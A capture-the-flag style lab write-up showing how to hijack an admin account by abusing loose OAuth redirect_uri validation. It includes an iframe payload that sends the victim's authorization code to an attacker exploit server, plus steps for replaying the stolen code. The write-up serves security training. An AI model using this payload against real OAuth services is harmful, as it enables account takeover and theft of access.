# Lab: OAuth account hijacking via redirect_uri

**Difficulty:** Practitioner

## Objective

Exploit an insecure `redirect_uri` validation in the OAuth provider to steal the **Admin's Authorization Code**, then use it to log in as the Admin and delete the user **carlos**.

---

# Solution

## 1. Log in using OAuth

Log in normally using the provided OAuth account.

---

## 2. Capture the Authorization Request

Intercept the following request and send it to **Burp Repeater**.

```http
GET /auth?client_id=wjqsu7jwj51kbwsjwozrw&redirect_uri=https://0adc003304137b87809f442500f0000f.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2

Host: oauth-0aa900da040b7b6480a24294027a000c.oauth-server.net
```

---

## 3. Confirm the Redirect URI Vulnerability

Replace the original `redirect_uri` with your **Exploit Server** URL.

Example:

```text
https://exploit-0ac4004a04397bed80154376016400c1.exploit-server.net
```

Send the request.

If the vulnerability exists, the OAuth provider will redirect the authorization code to your Exploit Server.

Example response:

```text
Redirecting to:

https://exploit-0ac4004a04397bed80154376016400c1.exploit-server.net/?code=Bd1SZ7tOw37elHvhGlqjnYWEsWXmKXcZeXlvJRRph49
```

> This authorization code belongs to my own account. At this stage, the goal is only to verify that the vulnerability is exploitable.

---

## 4. Create the Exploit

Create the following payload on the Exploit Server.

```html
<iframe src="https://oauth-0aa900da040b7b6480a24294027a000c.oauth-server.net/auth?client_id=wjqsu7jwj51kbwsjwozrw&redirect_uri=https://exploit-0ac4004a04397bed80154376016400c1.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Then:

- Store
- View Exploit
- Deliver Exploit to Victim

---

## 5. Capture the Admin's Authorization Code

After the victim visits the exploit page, open the **Access Log**.

Look for a request similar to:

```text
GET /?code=u3HOeG4QDLfq5uwgzLdY5BKU8sGfWt8rzO7df08H6Aa HTTP/1.1
```

The value after:

```text
code=
```

is the **Admin's Authorization Code**.

---

## 6. Log in as the Admin

Authorization Codes are **single-use** and expire very quickly.

Immediately open:

```text
https://0adc003304137b87809f442500f0000f.web-security-academy.net/oauth-callback?code=u3HOeG4QDLfq5uwgzLdY5BKU8sGfWt8rzO7df08H6Aa
```

Replace the code with the one stolen from the Access Log.

If the code is still valid, you will be authenticated as the **Admin**.

---

## 7. Solve the Lab

- Open **Admin Panel**
- Delete the user **carlos**

The lab is now solved.

---

# Why did the attack work?

The OAuth Provider failed to properly validate the **redirect_uri** parameter.

Because of this, an attacker could replace the legitimate callback URL with their own **Exploit Server**.

When the victim authenticated successfully, the OAuth Provider redirected the **Authorization Code** to the attacker's server instead of the legitimate application.

The attacker then reused this stolen Authorization Code by visiting:

```text
/oauth-callback?code=STOLEN_CODE
```

which completed the OAuth flow and authenticated them as the victim without needing the victim's credentials.
